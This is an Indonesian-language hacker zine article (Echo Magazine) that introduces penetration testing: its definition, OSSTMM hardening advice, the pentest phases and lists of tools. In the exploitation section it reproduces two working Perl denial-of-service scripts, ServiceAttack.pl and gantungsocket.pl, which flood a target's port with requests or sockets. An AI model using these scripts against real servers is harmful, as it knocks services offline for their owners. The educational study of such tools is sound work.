@@ -1,0 +1,292 @@
+                                                
+              .;               .-.              
+  .-.  .-.    ;;-. .-..-.      `-' . ,';.  .-.  
+.;.-' ;      ;;  ;;   ;' ;.   ;'   ;;  ;;.;.-'  
+ `:::'`;;;;'.;`  ``;;'(   ;_.;:._.';  ;;  `:::' 
+                       `-'        ;    `.       
+ECHO MAGAZINE VOLUME IX, ISSUE XXIV, PHILE 0x0A.TXT
+
+New Comer Series: Introduction to Penetration Testing - _patusa.cyber_
+http://www.patusainside.wordpress.com
+
+-----[ Penetration Testing
+
+Sebelum terlalu jauh membahas tentang penetration testing, alangkah
+baiknya kita terlebih dahulu mengetahui tentang definisi dari
+penetration testing itu sendiri. Merujuk dari penjelasan yang diberikan
+wikipedia, penetration testing merupakan sebuah metode untuk
+meng-evakuasi keamanan sistem komputer melalui simulasi pennyerangan
+terhadap target dengan menggunakan malicious source (program jahat).
+Secara umum, proses penetration system banyak disamakan oleh para
+junior system administrator  dengan proses vulnerability system
+assessment. 
+
+Kesalahan mindset tersebut menjadi suatu kesalahan fatal dalam
+pengelolaan keamanan sistem komputer. Vulnerability system assessment
+merupakan sebuah prosedur scanning terhadap vulnerabilities yang
+terdapat pada sistem dan melalukan filtering terhadap kelemahan
+tersebut untuk menghindari aksi eksploitasi oleh hacker. Hal ini jelas
+hampir mirip dengan pengertian harfiah dari penetration testing yang
+mana proses pencarian terhadap vulnerabilities (kelemahan) dan
+melakukan eksploitasi terhadap sistem tersebut hingga tester mengetahui
+titik lemah sebenarnya dari sistem tersebut.  
+
+Alasan umum tentang mengapa system administrator WAJIB melakukan
+penetration testing terhadap systemnya sendiri antara lain untuk
+menemukan titik kelemahan dan vulnerabilities system sebelum titik
+kelemahan tersebut dieksploitasi oleh hacker, memberikan gambaran bahwa
+manajemen terhadap system keamanan komputer merupakan sebuah hal
+keharusan yang harus dilakukan, menguji coba terhadap mekanisme
+firewal/alur keamanan sistem dan meng-evaluasi apakah sistem yang
+digunakan sudah memenuhi standar keamanan sistem komputer (walaupun
+sampai saat ini saya sendiri tidak mengetahui tolak ukur sebenarnya apa
+yang dikatakan sistem yang aman), melakukan tracing terhadap kesalahan
+internal (kesalahan penerapan algoritma keamanan komputer/rule hak
+akses) dan bagaimana mempermudah system administrator dalam mengelola
+management log jika terjadi insiden penyerangan pada sistem (dalam hal
+ini erat kaitannya dengan digital forensic).  
+
+Merujuk pada paper OSSTMM (December 13, 2006), dijabarkan mengenai
+teori pengimplementasian sistem keamanan komputer yang dinilai cukup
+aman untuk meminimalisir tingkat kecelahan keamanan terhadap server.
+Beberapa metode keamanan komputer yang dapat implementasikan pada
+sistem antara lain : 
+
+Internet Gateway and Service
+
+- Jangan pernah menggunakan remote akses yang tidak terenkripsi
+- Jangan pernah menggunakan remote akses yang tidak terautentifikasi
+- Lakukan pembatasan akses yang diperboleh baik itu diijinkan ataupun
+  ditolak secara spesifik
+- Lakukan monitoring secara berkala dan lakukan pencatatan log
+- Desentralisasi
+- Batasi antara koneksi sistem yang tidak terpercaya 
+- Lakukan proses "penyeleksian" terhadap inputan yang diterima server
+  dan lakukan validasi terlebih dahulu
+- Lakukan installasi program yang sesuai dengan kebutuhan
+- Selalu usahakan server berada pada status "invisible" User
+- Desentralisasi autorisasi
+- Hak akses terhadap sistem hanya dapat dilakukan pada jaringan
+  internal
+- Membatasi informasi yang diberikan kepada user mengenai teknologi
+  infrastruktur dan Informasi Server
+
+Secara umum, tidak adan aturan baku yang benar-benar mengatur tentang
+proses penetrasi terhadap server. Tingkat keberhasilan proses penetrasi
+terhadap server sendiri ditentukan dari tingkat kekreativitasan tester
+untuk berpikir mencari jalan terbaik dan terefektif untuk memperoleh
+hasil seakurat mungkin terhadap kelemahan server. merujuk pada
+refferensi "Professional Penetration Testing", dikemukakan beberapa
+tahapan yang "umum" dilakukan oleh tester untuk mencari kelemahan dari
+server 
+
+1. Information Gathering
+   Information Gathering difokuskan untuk dapat mengumpulkan informasi
+   secukupnya mengenai sistem target. proses pengumpulan informasi
+   sendiri terbagi menjadi dua, yaitu passive information gathering dan
+   active information gathering. pengumpulan informasi menggunakan
+   teknik passive information gathering dapat menggunakan service
+   WHOIS, DNS, Search Engine (Google), Website Analisis Security
+   (netcraft) dan tools seperti Maltego, metagofil dan tracerout.
+   Sedangkan untuk prosedur active information gathering biasanya
+   hacker menggunakan teknik Port Scanning, Banner Grab,
+   Fingerprinting, Network Mapping dan ARP Poisoning
+
+2. Vulnerability Scanning 
+   Langkah ini merupakan lanjutan dari proses Information Gathering,
+   tujuan melakukan proses ini untuk mengidentifikasi kelemahan yang
+   kemungkinan dapat dimanfaatkan untuk proses eksploitasi.
+   Vulnerability Scanning dapat menggunakan Database-database
+   vulnerabilites website seperti: CVE Database, SecurityFocus, Milis
+   Bugtraq, Inesecure, cve.mitre.org, xforce.iss.net,
+   packetstormsecurity.org, kb.cert.org/vuls. 
+   
+   Selain menggunakan database vulnerabilites website, penggunaan tools
+   dalam hal vulnerability Scanning juga dapat dilakukan dengan
+   menggunakan software seperti: Nessus, Qualys, Fuzzing (Vunelrability
+   Scanning Web Based), Nikto (Vunelrability Scanning Web Based), dan
+   WebInspect (Vunelrability Scanning Web Based).  
+
+3. Penetration Testing
+   Tahapan ini merupakan tahapan yang paling ditunggu-tunggu oleh para
+   hacker, tujuan dari tahapan ini adalah eksploitasi terhadap
+   kelemahan system (vulnerabilities system) yang sudah didapatkan pada
+   tahapan sebelumnya. tahapan dalam penetration testing antara lain
+   gaining access,Escalate Privilage, Maintain Access, Clean Up. 
+   
+   Proses gaining access (penetrasi) dapat menggunakan beberapa cara,
+   antara lain dengan penggunaan Metasploit. Untuk proses Escalate
+   Privilege merupakan sebuah proses untuk peningkatan hak akses yang
+   sudah didapatkan oleh hacker. teknik yang biasanya dilakukan antara
+   lain  crack admin/crack password, brute-force dan rainbow tables. 
+   
+   Langkah selanjutnya yang harus dilakukan apabila sudah mendapatkan
+   hak akses adalah dengan menjaga hak akses tersebut agar kita tetap
+   bisa masuk ke dalam sistem tanpa bersusah payah seperti di awal
+   (Maintain Access), salah satu metode yang sering digunakan antara
+   lain rootkits dan trojans. langkah terakhir yang harus dilakukan
+   oleh hacker setelah mendapatkan seluruh informasi yang dia butuhkan
+   adalah dengan menghilangkan semua jejak yang tertinggal dalam
+   sistem.  
+   
+   Salah satu item penetration testing yang dapat digunakan untuk
+   menguji tentang ketahanan dan kekuatan server dapat menggunakan
+   teknik DoS, DoS merupakan sebuah proses yang difokuskan untuk
+   menghabiskan resource yang terdapat pada sistem target. varian
+   terbaru dari serang DoS adalah DDoS, DDoS adalah sebuah serangan
+   flodding yang menggunakan puluhan hingga ribuan zombie (victim
+   komputer yang sudah diinfeksi terlebih dahulu) yang bertujuan untuk
+   menghabiskan resource dari sebuah server. 
+   
+   Serangan DoS sendiri terbagi menjadi beberapa jenis  antara lain
+   yang cukup terkenal adalah  Smurf, Fraggle, SYN Flood, Teardrop dan
+   Ping Of Death. berikut ini saya lampirkan beberapa script DoS yang
+   saya gunakan untuk melakukan penetration test terhadap server lokal
+   yang pernah saya gunakan (Shoutz and Tribute to MOBY dan Y3DIPS).
+   saya hanya menyesuaikan dengan kondisi jaringan yang saya gunakan.
+   Bagi yang ingin menggunakannya harap teliti untuk mengganti beberapa
+   settingan di dalam script tersebut ServiceAttack.pl (sebuah script
+   Dos yang langsung melakukan serangan kepada service port 81) 
+   
+--------------------- ServiceAttack.pl -----------------   
+   #!/usr/bin/perl -w
+
+	use IO::Socket;
+
+    	printf"\n***********************************************************************\n";
+
+      	print "  * Script perl disini digunakan untuk melakukan serangan D.O.S       *\n";
+		print "  * thanks to modified, tested and credit for y3dips, new inspiration *\n";
+		print "  *          based on <Luis Wong> lwong [at]mpsnet.net.mx             *\n";
+		print "  *      greetz to echostaff a.k.a the_day, moby, comex, all crew     *\n";
+		printf"  ***********************************************************************\n\n";
+
+ 	if(@ARGV == 1){
+      		my $host = $ARGV[0];
+      		my $i;
+      		while(){
+		$sock = IO::Socket::INET->new(PeerAddr => $host,
+				      PeerPort => "81",
+				      Proto => 'tcp');
+		unless($sock){
+	  	die "  kalo masih ngak bisa, check portnya atau ditolak ama si target server!.";
+		}
+		$sock->autoflush(1);
+		print $sock "POST /eCHo.htm HTTP/1.1\nHost: $host\nTransfer-Encoding: 
+		chunked\n\n90000000\n\n";
+		while ( <$sock> ){ 
+	    	print; 
+		}
+
+		close $sock;
+       		$i++;
+		print ".";
+    		}
+		}else{
+
+      	print "           [GUnakan] ...   ./$0 'HosT'      <<  untuk linux \n"  ;
+      	print "           [Gunakan] ...   perl $0 'Host'   <<untuk windows  \n";
+	}  
+-------------------- ServiceAttack.pl --------------------
+
+	gantungscoket.pl (Script ini bertujuan untuk menyerang langsung socket dari server)
+	
+-------------------- gantungsocket.pl --------------------    
+    #!/usr/bin/perl
+ 
+	use IO::Socket;
+
+	if (!$ARGV[1]) {
+
+		print "Cara Menggunakanna: perl gantungsocket.pl [host] [port] \n";
+		exit;
+
+		}
+	for (1..1300) {
+		$fh{$_}=new IO::Socket::INET
+			PeerAddr=> "$ARGV[0]",
+			PeerPort=> "$ARGV[1]",
+			Proto => "tcp"
+	or die; print "$_\n"
+
+	}
+	# Thx to MOBY for your based code 
+-------------------- gantungsocket.pl ---------------------
+
+
+4.  Analisis terhadap proses pentest
+    Setelah mendapatkan hasil yang cukup memuaskan, salah satu tugas
+    terpenting dari seorang tester adalah melakukan analisis terhadap
+    permasalahan dan vulnerabities yang sudah berhasil di eksploitasi
+    sehingga menemukan sebuah solusi/jalan keluar untuk menangani
+    permasalahan tersebut. 
+
+5.	Documentation
+    Proses ini merupakan langkah terakhir dari proses Pentest. Intisari
+    dari dokumentasi penetration testing ialah untuk mengklasifikasikan
+    vulnerabilities tersebut berada pada posisi mana apakah tergolong
+    beresiko tinggi, beresiko menengah, ataupun tidak beresiko sama
+    sekali
+
+
+-----[ Link Bermanfaat
+
+Untuk melakukan simulasi tentang proses penetrasi alangkah baiknya
+junior administrator dapat bermain-main terlebih dahulu dengan beberapa
+tools dibawah ini, antara lain 
+    
+    1. Backtrack
+	2. Nmap (http://www.insecure.org/nmap/)
+	3. Nessus (http://www.nessus.org/)
+	4. Metasploit (http://metasploit.org/)
+	5. WebScarab
+	6. Wireshark
+	7. Immunity Canvas (http://www.immunitysec.com/index.shtml)
+	8. IP Scanner (http://www.topshareware.com/IPScanner-download-11457.htm)
+	9. ISS Internet Scanner (http://www.iss.net)
+	10. CSS Cisco Security Scanner (http://www.cisco.com)
+	11. N-Stealth Scanner (http://www.nstalker.com/eng/products/nstealth)
+	12. SuperScan 4.0 (http://www.scanwith.com/download/SuperScan.htm)
+
+setelah cukup familiar dengan beberapa tools tersebut tidak ada
+salahnya untuk mencoba melakukannya dalam sebuah simulasi, perlengkapan
+yang mungkin dibutuhkan antara lain De-ICE Pentest Disc, Metasploit
+Unleashed, WebGoat, HackThisSite, Hax.tor.hu, 
+	
+Selain beberapa refferensi yang sudah saya berikan diatas, informasi
+tentang tools untuk melakukan penetrasi juga dapat ditemukan pada site
+dibawah ini,
+
+1. http://www.frozentech.com/content/livecd.php 
+   Live CD bootable linux dengan tools yang dilengkapi dengan tools untuk
+   penetration testing
+
+2. http://www.remote-exploit.org 
+   Situs yang menjadi "kandang" hacking, salah satu produk terkenal yang
+   disediakan remote exploit adalah backtrack 
+
+3. http://examples.oreilly.com/networksa/tools/ situs ini
+   berisi kira-kira 100 buah tools yang digunakan untuk penetration
+   testing
+
+Beberapa website yang menyediakan database tentang vulnerabilities
+system antara lain :
+1. Milworm (http://www.milw0rm.com) *down
+2. Metasploit (http://www.metasploit.com)
+3. Security Focus (http://www.securityfocus.com)
+4. Packet Storm Security (http://www.packetstormsecurity.org)
+
+-----[ Referensi
+
+[x] Thomas, Wilhelm. Professional Penetration Testing. Rockland:
+    Syngress Publishing Inc, 2010 
+[x] http://www.bitsecglobalforensics.com/netdefense.co.uk 
+[x] Paper OSSTMM  2.2. (Open-Source Security Testing Methodology Manual) 
+
+-----[ Shoutz
+Allah SWT Beserta Nabi Muhammad SAW
+MOBY - thanks atas script DOS nya yang masih bisa digunakan (Salam
+       Sanak Sakampuang) :D 
+Y3DIPS
+EchoStaff||
+_Cheppy_
